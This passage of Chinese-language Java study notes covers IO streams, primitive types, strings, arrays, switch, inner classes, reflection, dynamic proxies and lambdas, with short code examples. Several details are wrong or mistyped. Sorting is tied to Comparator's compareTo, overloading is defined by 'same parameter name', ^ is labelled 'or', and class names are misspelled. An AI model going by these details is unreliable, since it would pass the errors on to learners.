salary);\t&#125;&#125;\n\nIO流字节流和字符流\n根据数据流向的方向不同，分为输入流和输出流\n\nIO流的输入\\出源有控制台、文件、网络、数据库…\n常用的IO流：分字节流（以字节，8bit为单位对数据进行读写操作）和字符流（以字符为单位，一个字符占2个字节）\n输入字节流包含：文件（File）、对象（Object）、字节数组（ByteArray）、管道（Pipe）、过滤器（Filter）、缓冲字符串、顺序输入流（InputStream），都是InputStream（抽象类）的子类\n输出字节流包含：文件（File）、对象（Object）、字节数组（ByteArray）、管道（Pipe）、过滤器（Filter）输出流（OutputStream），都是OutputStream（抽象类）的子类\n输入字符流包含：字符数组（CharArray）、字符串（String）、其他输入流的缓冲区（Buffered）、管道（Piped）、过滤器（Filter）、将字节输入流转换为字符输入流（InputStream）Reader，都是Reader的子类（Reader是所有字符输入流的父类）\n输出字符流包含：字符数组（CharArray）、字符串（String）、其他输出流的缓冲区（Buffered）、管道（Piped）、过滤器（Filter）、将字节输入流转换为字符输入流（InputStream）Writer，都是Writer的子类（Writer是所有字符输出流的父类）\n节点流和处理流节点流是低级流，直接与数据源相连，并且进行读写；处理流是高级流，不直接和数据源相连（采用装饰器模式对节点流进行封装），主要用于消除不同节点实现上的差异。\n节点流包含：FileInputStream、FileOutputStream、FileReader、FileWriter\n处理流包含：BufferInputStream（FilterInputStream的实现类）、BufferOutputStream、BufferReader、BufferWriter\n处理流相比节点流的优点：通过增加缓存提高了数据输入和输出的效率、封装了一系列高级方法来完成一次性大批量数据的输入和输出\n内存映射文件技术含义：操作系统利用虚拟内存将文件映射到内存中，然后，这个文件就可以被当作内存数据来访问\n关键技术优势：\n\n让操作系统负责文件的读写，应用程序只需要处理内存数据，就可以实现IO操作；\n可以实现共享内存，内存映射文件可以被多个进程同时访问；内存映射文件技术涉及的内存在Java的堆空间之外；\n大幅提升文件数据的输入输出速度\n\nJava的NIO包支持内存映射技术，实现方式是通过MapperdBytyBuffer读写内存\n数据类型8种基本类型在Java中共有8种基本类型（primitive type），其中包含4种整型、2种浮点型、1种字符类型（用于表示Unicode编码）和1种真值类型。\n\n4种整型\nbyte：1字节；取值范围是从-128 (-2^7) 到 127 (2^7 - 1)\nshort：2字节；取值范围是从 -32,768 (-2^15) 到 32,767 (2^15 - 1)\nint：4字节；取值范围是从 -2,147,483,648 (-2^31) 到 2,147,483,647 (2^31 - 1)\nlong：8字节；取值范围是从-9,223,372,036,854,775,808 (-2^63) 到 9,223,372,036,854,775,807 (2^63 - 1)\nJava整型数值的表示方法：\n\n长整型（long）数值后面有一个后缀L或l\n\n十六进制数值有一个前缀0X或0x\n\n八进制有一个前缀0\n\n二进制有一个前缀0B或0b\n\n可以在整数类型的数字字面量上加下划线进行分组，以提高可读性\n\n\n\nJava和C++的不同：\nJava中整型的范围是平台无关的，而C++（C同样也是）中，是平台相关的。\n\n\n2种浮点型\nfloat：4字节；取值范围是大约是正负3.4E+38（约7位有效数字）\ndouble：8字节；取值范围大约是正负1.7E+308（约15位有效数字）\n取值范围是由IEEE 754浮点数标准规定的，float类型的32位二进制数被划分为三个部分：1个符号位，8个指数位和23个尾数位。double类型的64位二进制数被划分为三个部分：1个符号位，11个指数位和52个尾数位。其中，指数位决定了浮点数的范围，尾数位决定了浮点数的精度。\ndouble这种表示浮点数的类型数值精度是float类型的两倍，所以称为双精度浮点数。\nJava整型数值的表示方法：\n\nfloat类型的数值有一个后缀F或f\ndouble类型的数值既可以没有后缀，也可以有一个后缀D或d，所以Java中没有后缀的浮点数类型默认是double\n\n\n 警告： \n浮点数不适用于无法接受舍入误差的金童计算，如果需要精确的数值计算，不允许有舍入误差，应该使用BigDecimal类。\n\n\n1种字符类型\nchar：2字节；取值范围是从0到65535（包括0和65535）\nchar类型的作用主要有两个，表示单个字符，以及表示Unicode字符（目前，16位的char类型已经不足以描述所有Unicode字符了，部分Unicode字符需要两个char来表示）。\n\n备注：\nUnicode字符是一种用于表示文本字符的国际标准编码系统。它为几乎所有的字符（包括字母、数字、标点符号、符号、表情符号等）分配了唯一的代码点，以便在计算机系统中进行存储和处理。\nUnicode字符使用十六进制表示，前缀为”\\u”，后跟四个十六进制数字。\nUnicode转义序列会在解释代码之前处理。\n\n\n1种真值类型\nboolean：“大小”并不是精确定义的，通常是1字节；取值范围是true或false\n\n注意：\n在Java8HotSpot虚拟机下，单个boolean数值和数组中的boolean数值都是占1个字节。\n使用JOL对象布局分析工具，编写测试程序如下：\npublic class BooleanLength &#123;    public static void main(String[] args) &#123;        boolean b = true;        boolean[] bArr = new boolean[]&#123;true&#125;;        System.out.println(ClassLayout.parseInstance(b).toPrintable());        System.out.println(ClassLayout.parseInstance(bArr).toPrintable());    &#125;&#125;\n\n输出结果如下：\n\n可以看到无论是单个boolean对象还是数组中的boolean对象，其boolean数值都只占1个字节。\n\n\n\n在Java中只有基本类型不是对象。\n字符串Java字符串（String类对象）是Unicode字符序列，每个字符char都对应一个Unicode码点。\n字符串不可变\n\n String objects are immutable, which means that once created, their values cannot be changed. \n\nJava中字符串是不可变的（immutable），并且也没有提供任何方法来修改字符串中的某个字符。\n字符串共享\n字符串常量池是一块位于Java堆内存中的特殊存储区域，用于存储字符串字面量（直接以双引号括起来的字符串）和显式通过String类的intern()方法调用加入常量池的字符串。当创建字符串时，如果字符串常量池中已经存在相同内容的字符串，则不会创建新的字符串对象，而是直接返回常量池中的字符串引用。\n需要注意的是，通过new关键字创建的字符串对象不会被共享，而是在堆内存中创建新的对象。只有使用字符串字面量或显式调用intern()方法将字符串加入常量池时才会进行共享。此外，+或substring等操作得到的字符串也不共享。\n检测字符串是否相等\nString类覆盖了equals方法。\n可以使用equals方法检测两个字符串是否相等，不能使用&#x3D;&#x3D;运算符，因为&#x3D;&#x3D;运算符只能确定两个字符串是否存储在同一个位置上，而Java中的相等的字符串可以存储在不共享的位置，不能仅通过位置判断是否相等。\n文本块\nJava15新增了文本块（text block）特性，提供了跨多行的字符串字面量。\n文本块特别适合包含用其它语言编写的代码，如SQL或HTML。\n文本块示例：\nString html = &quot;&quot;&quot;    &lt;div&gt;    \tHTML...    &lt;/div&gt;&quot;&quot;&quot;;\n\n文本块需要转义的情况：\n\n文本块以引号结尾\n\n文本块中包含三个及以上的引号\n\n文本块中有反斜杠（\\）\n\n文本块以空格结尾\n文本块会删除末尾的空格，如果需要保留末尾的空格，可以把空格替换为\\s。\n\n\n大数Java的java.math包中提供了两个重要的数值处理类，BigInteger和BigDecimal，用于处理大整数和高精度浮点数的运算。BigInteger类能够表示任意精度的整数。BigDecimal类能够实现任意精度的浮点数运算。\n数组for each循环的对象必须是一份数组或者是一个实现了Iterable接口的类对象。\nArrays类\n\n数组打印\n如果要打印数组中的所有值，可以使用另一种方法，使用Arrays类的toString方法，该方法会返回一个包含数组元素的字符串，这些元素包围在中括号内，并使用逗号分隔。\nSystem.out.println(Arrays.toString(a));\n\n数组拷贝\n如果要拷贝数组内的所有值，可以使用Arrays类的copyOf方法。\nint[] copiedArray = Arrays.copyOf(a, length); //第二个参数length是新数组的长度\n\n如果要拷贝数组内指定范围内的所有值，可以使用Arrays类的copyOfRange方法。\n\n数组排序\n如果要对数值型的数组进行排序，可以使用Arrays类中的sort方法。如果是其它类型的数组，也可以使用该方法，前提是数组元素的类实现了Comparator接口的compareTo方法（x小于y时返回负数）。\n这个方法使用了优化的快速排序（QuickSort）算法\n\n数组二分查找\n如果要使用二分查找算法在有序数组a中或a中的指定范围内查找值v，可以使用Arrays的binarySearch方法，如果找到v，该方法会返回值的索引，否则返回一个负数值r，-r-1是v在保持a有序的前提下可以插入的位置。\n\n数组填充\n如果要将数组所有元素设置为指定值，可以使用Arrays类的fill方法。\n\n数组元素比较\n如果两个数组长度相同，并且相同索引对应的元素都相同，则返回true。\n\nList集合转数组\n将List集合转为数组可以使用toArray()方法。\n\n基本类型的数组转List\n//基本类型也可以实现转换（依赖boxed的装箱操作）int[] myArray =&#123;1,2,3&#125;;List myList =Arrays.stream(myArray2).boxed().collect(Collectors.toList());\n\n不规则数组\nJava中的数组可以是不规则的数组，即数组的每一行有不同的长度。\n\nJava和C++的不同：\nC++的Vector是按值复制的，赋值操作b&#x3D;a将会构造一个与a长度相同的新向量，并将所有元素从a复制到b。而在Java中，这条赋值语句的操作结果是让a和b引用同一个数组列表。\n\n运算符位运算符Java的运算符包括&amp;（and）、|（or）、^（or）、~（not）。\n对于布尔值，&amp;和|运算符的返回结果也是布尔值，不过与&amp;&amp;和||不同的是，$和|运算符不是短路的，也就是说，计算结果之前两个操作数都需要计算\n位移运算符Java的位移运算符包括&gt;&gt;、&lt;&lt;、&gt;&gt;&gt;，不存在&lt;&lt;&lt;。\n\n&gt;&gt;会用符号位填充高位\n&gt;&gt;&gt;会用0填充高位\n\nswitch语句Java14中引入switch，既可以作为语句，也可以做表达式。\n参数类型\n可以作为switch参数数据类型的有：int、bype、short、char、String、枚举、（int、bype、short、char）的包装类\n不能作为switch参数的有：long、float、double、boolean、复杂的表达式、……\ncase的参数可以有多个。如case &quot;Summer&quot;， &quot;Winter&quot; -&gt; 0;\n直通和非直通\nJava中switch语句的行为可以被描述为直通和非直通：\n\n直通行为\n\ncase以冒号（:）结尾，是有直通行为的。\n\n\n非直通行为\n\ncase以箭头（-&gt;）结尾，是无直通行为的。\nswitch表达式中有yield关键字，yield关键字会返回表达式的值并终止执行。\nswitch表达式中有break关键字，break关键字会终止执行，switch表达式中不能使用return、break或continue语句。\n\n\n\nswitch的使用方法\n\n-&gt;\n\nswitch表达式\n\n直接返回值\nenum Size &#123;SMALL, MEDIUM, LARGE, EXTRA_LARGE&#125;;Size size = Size.LARGE;// switch表达式String result = switch (size) &#123;    case SMALL -&gt; &quot;S&quot;;    case MEDIUM -&gt; &quot;M&quot;;    case LARGE -&gt; &quot;L&quot;;    case EXTRA_LARGE -&gt; &quot;XL&quot;;&#125;;\n\n使用yield返回值\nenum Size &#123;SMALL, MEDIUM, LARGE, EXTRA_LARGE&#125;;Size size = Size.LARGE;String result = switch (size) &#123;    case SMALL -&gt; &#123;        yield &quot;S&quot;;    &#125;    case MEDIUM -&gt; &#123;        yield &quot;M&quot;;    &#125;    case LARGE -&gt; &#123;        yield &quot;L&quot;;    &#125;    case EXTRA_LARGE -&gt; &#123;        yield &quot;XL&quot;;    &#125;&#125;;\n\n\nswitch语句\n\n直接赋值\nenum Size &#123;SMALL, MEDIUM, LARGE, EXTRA_LARGE&#125;;Size size = Size.LARGE;String result;// switch语句switch (size) &#123;    case SMALL -&gt; result = &quot;S&quot;;    case MEDIUM -&gt; result = &quot;M&quot;;    case LARGE -&gt; result = &quot;L&quot;;    case EXTRA_LARGE -&gt; result = &quot;XL&quot;;&#125;;\n\n\n\n\n:\n\nswitch表达式\n\n使用yield返回值\nenum Size &#123;SMALL, MEDIUM, LARGE, EXTRA_LARGE&#125;;Size size = Size.LARGE;String result = switch (size) &#123;     case SMALL:         yield &quot;S&quot;;     case MEDIUM:         yield &quot;M&quot;;     case LARGE:         yield &quot;L&quot;;     case EXTRA_LARGE:         yield &quot;XL&quot;; &#125;;\n\n\nswitch语句\n\n赋值后使用break返回\nenum Size &#123;SMALL, MEDIUM, LARGE, EXTRA_LARGE&#125;;Size size = Size.LARGE;String result;switch (size) &#123;    case SMALL:        result = &quot;S&quot;;        break;    case MEDIUM:        result = &quot;M&quot;;        break;    case LARGE:        result = &quot;L&quot;;        break;    case EXTRA_LARGE:        result = &quot;XL&quot;;        break;&#125;\n\n\n\n\n\n数值类型转换数值类型转换中int转float，long转double可能产生精度损失。\n自动类型转换\n二元运算符在计算前会先将两个操作数转换为同一类型，如果有一个操作数是double&#x2F;float&#x2F;long（存在优先顺序），另一个操作数就会被转换（自动类型转换）为double&#x2F;float&#x2F;long。\n强制类型转换\n对于可能丢失信息的转换需要通过强制类型转换完成。\n浮点数转换为整数时会截断小数位。\n数学函数MathMath.pow方法：进行幂运算，Java中没有完成幂运算的运算符\nMath.round方法：舍入（round）浮点数来得到最接近的整数\nMath.ramdom方法：返回一个0到1（包含0，不包含1）之间的随机浮点数，用n乘以这个浮点数，可以得到从0到n-1之间的一个随机数。例如：int result = (int) (Math.random() * n);\n对象与类面向对象编程的概念封装（encapsulation）\n从形式上看，封装就是将数据和行为组合在一个包中，并对对象的使用者隐藏具体的实现细节。\n实现封装的关键在于，不能让其它类中的方法直接访问被封装的类的实例字段，程序只能通过对象的方法与对象的数据进行交互。这意味着一个类可以完全改变存储数据的方式，只要仍旧向外提供同样的方法，调用该方法的对象不需要关心这个类所发生的变化。\n继承（Inheritance）\n继承可以让实现Java类变得更容易，因为可以通过继承（extends、implements）其它类来构建新类。\n多态（Polymorphism）\n多态是指在父类或接口类型上使用不同的子类对象，以实现同一个方法的多种不同行为。一个父类变量既可以引用父类对象，也可以引用其任何一个子类的对象。\n类之间的关系\n\n\n关系\n含义\nUML（Unified Modeling Language）连接符\n关系强弱\n\n\n\n实现（Implementation，is-a）\nimplements interface\n虚线+三角箭头\n\n\n\n继承（Inheritance，is-a）\ninherits from\n实线+三角箭头\n\n\n\n依赖（Dependency，uses-a）\ndepend on\n虚线+三线箭头\n弱（如成员函数里的局部变量）\n\n\n关联（Association，uses-a）\nis associated with\n实线+三线箭头\n强（如成员变量）\n\n\n聚合（Aggregation，has-a）\nis an aggregate of\n空心菱形箭头+实线\n弱\n\n\n组合（Composition，has-a）\nis composed of\n实心菱形箭头+实线\n强\n\n\n\n\n\n\n\n\n方法参数方法参数能否改变的规则\n\n方法不能改变基本数据类型的参数\n方法可以改变对象参数的状态\n方法不能改变对象参数的引用对象\n\n变长参数\n在 Java 5 中提供了变长参数，允许在调用方法时传入不定长度的参数。变长参数是 Java 的一个语法糖，本质上还是基于数组的实现。\n定义变长参数的方法是，在最后一个形参后加上三点 …，就表示该形参可以接受多个参数值，需要注意的是：\n\n可变参数只能作为函数的最后一个参数，但其前面可以有也可以没有任何其他参数\n由于可变参数必须是最后一个参数，所以一个函数最多只能有一个可变参数\nJava的可变参数，会被编译器转型为一个数组\n\n重载重载（orverloading）指的是一个类的多个方法有相同的参数名，但是有不同的参数。\n包装器所有基本类型都有一个与之对应的类，这些类被称为包装器（wrapper），分别是：Byte、Integer、Long、Float、Double、Boolean、Character（前6个类派生于父类Number）。\n\n由于每个值分别包装在一个对象中，所以ArrayList&lt;Integer&gt;的效率远远低于int[]数组。\n\n自动装箱\nlist.add(1);会自动转换为list.add(Integer.valueOf(1))，这种转换称为自动装箱（autoboxing）。\n自动拆箱\n当将Integer对象赋给一个int值时，会自动拆箱（unboxed）。例如，int n &#x3D; list.get(i)会转换成int n &#x3D; list.get(i).intValue()。\n自动装箱和自动拆箱也适用于算术表达式。例如，对于Integer n &#x3D; 1; n++;编译器会自动地对n拆箱，将拆箱后的结果增1，最后再将其装箱。\n装箱和拆箱由编译器完成，而不是虚拟机。编译在再生成类的字节码时会插入必要的方法调用，虚拟机只是执行这些字节码。\n抽象类\nJava和C++的不同：\n在C++中，抽象方法称为纯虚函数（pure virtual function），要在末尾用&#x3D;0标记，没有用于表示抽象类的特殊关键字。\n\n枚举类在比较枚举类的值时，不需要使用equals，可以之间使用&#x3D;&#x3D;来比较。\n枚举类可以有构造器、方法和字段。\n有构造器、方法和字段的枚举类示例：\npublic enum Size &#123;    SMALL(&quot;S&quot;), MEDIUM(&quot;M&quot;), LARGE(&quot;L&quot;), EXTRA_LARGE(&quot;XL&quot;);    private final String abbreviation;    Size(String abbreviation) &#123;        this.abbreviation = abbreviation;    &#125;    public String getAbbreviation() &#123;        return abbreviation;    &#125;&#125;\n\n所有枚举类型都是抽象类Enum的子类。\n内部类内部类（inner class）是定义在类中类。\n内部类的分类：\n\n\n非静态的\nInner Classes：非静态内部类，又称成员内部类\nMethod Local Inner Classes：方法方法局部内部类\nAnnonymous Inner Classes：匿名内部类\n\n\n静态的（类的前面多了一个关键字static）\nStatic Nested Classes：静态内部类\n\n\n\n非静态内部类访问成员的规则\n\n非静态内部类可以无条件访问外部类的所有成员属性和成员方法（包括private成员和静态成员）。当非静态内部类拥有和外部类同名的成员变量或者方法时，会发生隐藏现象，即默认情况下访问的是非静态内部类的成员。如果要访问外部类的同名成员，需要以下面的形式进行访问：\n外部类.this.成员变量外部类.this.成员方法\n\n在外部类中如果要访问非静态内部类的成员，必须先创建一个非静态内部类的对象，再通过指向这个对象的引用来访问。\n\n\n创建的方法\n非静态内部类是依附外部类而存在的，也就是说，如果要创建非静态内部类的对象，前提是必须存在一个外部类的对象。\n//第一种方式：Outter outter = new Outter();Outter.Inner inner = outter.new Inner();  //必须通过Outter对象来创建\n\n访问权限修饰\n内部类可以拥有 private 访问权限、protected 访问权限、public 访问权限及包访问权限。比如上面的例子，如果非静态内部类 Inner 用 private 修饰，则只能在外部类的内部访问，如果用 public 修饰，则任何地方都能访问；如果用 protected 修饰，则只能在同一个包下或者继承外部类的情况下访问；如果是默认访问权限，则只能在同一个包下访问。\n静态内部类访问成员的规则\n\n静态内部类可以直接访问外部类的静态成员。如果要访问外部类的实例成员，需要通过外部类的实例去访问。\n外部类以外的其他类需要通过完整的类名访问静态内部类中的静态成员。如果要访问静态内部类中的实例成员，则需要通过静态内部类的实例。\n\n创建的方法\n在创建静态内部类的实例时，不需要创建外部类的实例。\n方法局部内部类方法局部内部类是定义在一个方法或者一个作用域里面的类。方法局部内部类只在当前方法中有效。\n实现规则\n\n方法局部内部类中不能定义 static 成员。\n方法局部内部类与局部变量一样，不能使用访问控制修饰符（public、private 和 protected）和 static 修饰符修饰。\n方法局部内部类中还可以包含内部类，但是这些内部类也不能使用访问控制修饰符（public、private 和 protected）和 static 修饰符修饰。\n\n访问成员的规则\n\n方法局部内部类只可以访问当前方法中 final 类型的参数与变量。\n在方法局部内部类中可以访问外部类的所有成员。如果方法中的成员与外部类中的成员同名，则可以使用 &lt;OuterClassName&gt;.this.&lt;MemberName&gt; 的形式访问外部类中的成员。\n\n\n匿名内部类匿名类是指没有类名的内部类，必须在创建时使用 new 语句来声明类。其语法形式如下：\nnew &lt;类或接口&gt;() &#123;    // 类的主体&#125;;\n\n匿名内部类不能是静态的。\n实现方法\n匿名类有两种实现方式：\n\n继承一个类，重写其方法。\n实现一个接口（可以是多个），实现其方法。\n\n访问成员的规则\n\n如果匿名类位于一个方法中，则匿名类只能访问方法中 final 类型的局部变量。\n匿名内部类可以访问外部类的所有成员。\n\n\nCloneableCloneable 是一个标记接口（marker interface），用于指示一个类可以被克隆（clone）。\n要让一个类可以被克隆，需要满足两个条件：\n\n类实现 Cloneable 接口。\n重写 clone() 方法，实现对象的克隆逻辑。\n\n继承继承的基本思想是基于已有的类创建新的类。\n\nJava和C++的不同：\nJava中继承是使用关键字extends，而C++中是使用冒号（:）\nJava中所有的继承都是公共继承，没有C++中的私有继承和保护继承。\n\n在覆盖一个方法的时候，子类的方法不能低于超类方法的可见性。\nfinal类和final方法final能够阻止类的继承，以及方法的覆盖。\nprotected访问修饰符protected是Java的一个访问修饰符（access modifier）。\n当一个类的成员被声明为 protected，意味着它只能被以下两种情况下的代码访问：\n\n在同一包内的其他类\n所有（在同一包或不同包中）的子类\n\n需要注意的是，protected 修饰符并不会对类本身的可见性产生影响，也就是说，如果一个public类的某个成员被声明为 protected，不同包下的非子类仍然能够访问该类，只是不能访问该类的protected成员。\n\n注意：\n如果在Java中不指定类中某个方法的访问修饰符，则默认使用包级私有（package-private）修饰符，而不是protected修饰符。\n\n覆盖覆盖（override）指的是子类提供从父类中继承的方法的新的实现。\nObject类equals方法Object类中的equals方法的默认实现是比较两个对象的引用地址（即内存地址）是否相同。所以如果需要比较两个对象中参数是否一致，就需要覆盖该equals方法。\nJava规范要求equals方法具有如下特性：\n\n自反性：对于非null的引用x，x.equals(x)应返回true。\n对称性：对于非null的引用x、y，x.equals(y)返回true时，y.equals(x)也要返回true。\n传递性：对于非null的引用x、y、z，x.equals(y)返回true且y.equals(z)返回true，则x.equals(z)返回true。\n一致性：如果x，y引用的对象没有发送变化，则反复调用x.equals(y)应该返回相同的结果。\n对于非null的引用x，x.equals(null)应返回false。\n\nhashCode方法Java中，散列码（hash code）是由对象导出的一个整型值（可以是负数）。\n内容相同的字符串有相同的散列码，这是因为字符串的散列码是由内容导出的。\n如果一个类覆盖了equals方法，则该类必须也覆盖hashCode方法。如果两个对象通过 equals 方法比较相等，那么它们的 hashCode 必须相等。比如如果equals方法比较的是参数id，那么hashCode方法就需要对id计算散列值，且不考虑其它的参数。\n\n提示：\n如果有数组类型的字段，那么可以使用静态的Arrays.hashCode方法计算一个散列码，该散列码有数组元素的散列码组成。\n\ngetClass方法Object类提供了getClass方法，返回值是对象的运行时类的Class对象。\n调用getClass().getName()可以得到对象的类名。\n反射概述反射（reflection）是在程序运行期间获取类的信息（如类名、类的方法、类的属性等信息）并进行操作（如创建对象、调用方法等操作）的技术。\n反射机制的核心类Java 反射机制的核心类包括“java.lang”包下的Class 类，以及“ java.lang.reflect”包下的Constructor类、Method类、Field类、Modifier类。这些类可以让我们在运行时动态地获取类的相关信息，并进行相应的操作。例如，我们可以使用Constructor类的newInstance()方法创建对象；使用Method 类中的 invoke() 方法来调用一个指定方法；使用 Field 类的 get() 和 set() 方法来读取或修改一个对象的属性值；使用Modifier类的isPublic()方法来判断类的修饰符是否是public。\nClass类虚拟机中每个类型只要唯一的Class对象，因此可以使用&#x3D;&#x3D;运算符比较两个类对象是否相等。\nClass类的部分方法示例：\n\ngetName方法，由获取的Class类对象获取类的全限定名（fully qualified name）\nInteger object = 1;Class classObject = object.getClass();//获取Class类对象String name = classObject.getName();\n\nforName方法，由类的全限定名获取Class类对象\nString name = &quot;java.lang.Integer&quot;;try &#123;\tclassObject = Class.forName(name);&#125; catch (ClassNotFoundException e) &#123;\tthrow new RuntimeException(e);&#125;\n\n由类型获取Class类对象\nClass classObject1 = Integer.class;Class classObject2 = int.class; //int不是类，但是int.Class是类对象\n\ngetConstructor方法，由Class类对象获取构造器\nClass classObject = TestGetLClass.class;try &#123;\tObject obj = classObject.getConstructor().newInstance();&#125; catch (InstantiationException | IllegalAccessException | InvocationTargetException | NoSuchMethodException e) &#123;\tthrow new RuntimeException(e);&#125;\n\nConstructorConstructor类的部分方法：\n\n\n\n方法签名\n用途\n\n\n\npublic T newInstance(Object … initargs)\n根据传递的参数创建类的对象\n\n\nMethodMethod类的部分方法：\n\n\n\n方法签名\n用途\n\n\n\npublic Object invoke(Object obj, Object… args)\ninvoke 方法是 Java 反射 API 中 Method 类的一个重要方法，用于调用方法并执行其逻辑。通过 invoke 方法，可以在运行时动态地调用特定对象上的方法，并传递参数。\n\n\npublic String getName()\n获取方法的名称\n\n\npublic &lt;T extends Annotation&gt; T getAnnotation(Class&lt;T&gt; annotationClass)\n获取指定类型的注解对象，如果存在的话\n\n\npublic Annotation[] getDeclaredAnnotations()\n获取所有注解对象的数组\n\n\nFieldField类的部分方法：\n\n\n\n方法签名\n用途\n\n\n\npublic int getInt(Object obj)\n获取指定对象中包含指定参数的整型值\n\n\npublic void setInt(Object obj, int i)\n置指定对象中表示的字段的整型值\n\n\npublic &lt;T extends Annotation&gt; T getAnnotation(Class&lt;T&gt; annotationClass)\n获取指定类型在字段上的注解实例\n\n\nModifierModifier类的部分方法：\n\n\n\n方法签名\n用途\n\n\n\npublic static boolean isPublic(int mod)\n根据传递的参数判断是否包含public\n\n\n反射的应用JDBC 的数据库的连接在JDBC 的操作中，如果要想进行数据库的连接，则必须按照以上的几步完成\n\n通过Class.forName()加载数据库的驱动程序 （通过反射加载，前提是引入相关了Jar包）\n通过 DriverManager 类进行数据库的连接，连接的时候要输入数据库的连接地址、用户名、密码\n通过Connection 接口接收连接\n\npublic class ConnectionJDBC &#123;      /**      * @param args      */      //驱动程序就是之前在classpath中配置的JDBC的驱动程序的JAR 包中      public static final String DBDRIVER = &quot;com.mysql.jdbc.Driver&quot;;      //连接地址是由各个数据库生产商单独提供的，所以需要单独记住      public static final String DBURL = &quot;jdbc:mysql://localhost:3306/test&quot;;      //连接数据库的用户名      public static final String DBUSER = &quot;root&quot;;      //连接数据库的密码      public static final String DBPASS = &quot;&quot;;                  public static void main(String[] args) throws Exception &#123;          Connection con = null; //表示数据库的连接对象          Class.forName(DBDRIVER); //1、使用CLASS 类加载驱动程序 ,反射机制的体现         con = DriverManager.getConnection(DBURL,DBUSER,DBPASS); //2、连接数据库          System.out.println(con);          con.close(); // 3、关闭数据库      &#125;&#125;\n\nSpring 框架的IoC在 Java的反射机制在做基础框架的时候非常有用，行内有一句这样的老话：反射机制是Java框架的基石。一般应用层面很少用，不过这种东西，现在很多开源框架基本都已经封装好了，自己基本用不着写。典型的除了hibernate之外，还有spring也用到很多反射机制。最经典的就是xml的配置模式。\nSpring 通过 XML 配置模式装载 Bean 的过程：\n\n将程序内所有 XML 或 Properties 配置文件加载入内存中\nJava类里面解析xml或properties里面的内容，得到对应实体类的字节码字符串以及相关的属性信息\n使用反射机制，根据这个字符串获得某个类的Class实例\n动态配置实例的属性\n\nSpring这样做的好处是：\n\n不用每一次都要在代码里面去new或者做其他的事情\n以后要改的话直接改配置文件，代码维护起来就很方便了\n\n代理概述代理（proxy）是在运行时创建创建接口的代理类和代理对象的技术。\n代理模式分为静态代理和动态代理两种。\n静态代理和动态代理最主要的区别是：静态代理在代码运行之前，代理类的.class文件就已经存在，而动态代理则与静态代理相反，在代码运行之前不存在代理类的.class文件，在代码运行时才动态的生成代理类。\n代理和反射的关系反射和代理之间的关系是：通过反射可以创建动态代理对象。\nJava中的动态代理是一种利用反射机制在运行时动态地创建代理对象的技术。通过动态代理，可以在运行时创建代理类和代理对象，并将方法的调用转发给代理对象的调用处理程序（如InvocationHandler的invoke方法）来处理，在方法调用前后执行一些额外的操作，例如记录日志、检查权限、实现缓存等。\nJDK动态代理机制核心类Java代理机制的核心类包括java.lang.reflect.Proxy类和java.lang.reflect.InvocationHandler接口。Proxy类用于创建代理类和代理对象，而InvocationHandler接口定义了代理对象的调用处理程序。\n创建代理对象的方法是调用Proxy类中的newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)方法，该方法的三个参数分别是类加载器（用于加载代理对象）、一组被代理类实现的接口、实现类InvocationHandler接口的对象（需要自定义InvocationHandler接口的实现类来自定义处理逻辑）。\n在代理对象调用方法时，实际上是调用了InvocationHandler的invoke方法。\n使用步骤\n定义一个接口及其实现类（被代理的类）；\n自定义 InvocationHandler 并重写invoke方法，在 invoke 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑；\n通过 Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) 方法创建代理对象；\n\nCGLIB动态代理机制JDK 动态代理有一个最致命的问题是其只能代理实现了接口的类。\n为了解决这个问题，我们可以用 CGLIB 动态代理机制来避免。\nCGLIBopen in new window(Code Generation Library)是一个基于ASMopen in new window的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。CGLIB 通过继承方式实现代理。很多知名的开源框架都使用到了CGLIBopen in new window， 例如 Spring 中的 AOP 模块中：如果目标对象实现了接口，则默认采用 JDK 动态代理，否则采用 CGLIB 动态代理。\n核心类CGLIB代理机制的核心类包括Enhancer类和MethodInterceptor接口。Enhancer类用于创建代理类和代理对象，而MethodInterceptor接口定义了代理对象的调用处理程序。\n当代理类调用方法的时候，实际调用的是 MethodInterceptor 中的 intercept 方法。需要自定义 MethodInterceptor 接口的实现类并实现 intercept 方法，intercept是用于拦截增强被代理类的方法。\n使用步骤\n添加CGLIB的依赖；\n定义一个类（被代理的类）；\n自定义 MethodInterceptor 并重写 intercept 方法，intercept 用于拦截增强被代理类的方法，和 JDK 动态代理中的 invoke 方法类似；\n通过 Enhancer 类的 create()创建代理类；\n\n代理的应用\nRPC框架：如Dubbo、gRPC等，通常使用动态代理来实现客户端的远程方法调用。客户端通过动态代理对象来调用远程服务的方法，而不需要直接关注底层的网络通信细节。代理对象将方法调用转发给远程服务，同时可以在方法调用前后添加一些额外的逻辑，比如实现负载均衡、服务治理、日志记录等。\nAOP（面向切面编程）：如Spring的AOP特性，就是利用代理机制实现对方法的增强。通过在程序运行期间动态地将额外的代码（称为切面）织入到现有的代码中，实现对系统的横切关注点（cross-cutting concerns）的管理。\n\n接口定位和特性接口（interface）用来描述类应该做什么（一组需求），而不指定应该怎么做（静态方法除外，从Java8开始允许在接口中增加静态方法包括方法的实现）。接口中除了可以声明方法，还可以定义静态常量。\n接口中的所有方法都默认是public方法，因此在接口中声明方法时，可以不提供关键字public。不过在实现接口时必须把方法声明为public；所有静态常量的类型默认是public static final类型，可以不提供关键字public static final。\n每个类只能有一个父类，但可以有多个接口。\n\nJava和C++的不同：\nJava只允许有一个父类，C++可以有多个父类。\nJava和C++都有抽象类的概念，但是C++中没有接口的概念。\n\n默认方法可以为接口中的方法提供一个默认实现，方法是在方法上添加default修饰符。\nLambda表达式Lambda表达式是一种用来创建代码块的简洁的方法。\n语法\n(参数列表) -&gt; 表达式\n\n即使Lambda表达式没有参数，仍然要带有括号。\nLambda表达式的示例：\n\n无参数的Lambda表达式： () -&gt; System.out.println(“Hello, Lambda!”);\n单个参数的Lambda表达式： (x) -&gt; System.out.println(“The value is: “ + x);\n多个参数的Lambda表达式： (x, y) -&gt; { int sum &#x3D; x + y; System.out.println(“The sum is: “ + sum); };\nLambda表达式作为方法的参数： Arrays.asList(1, 2, 3, 4, 5).forEach(n -&gt; System.out.println(n));\n\nLambda表达式中的变量必须是final或等效于final的（final or effectively 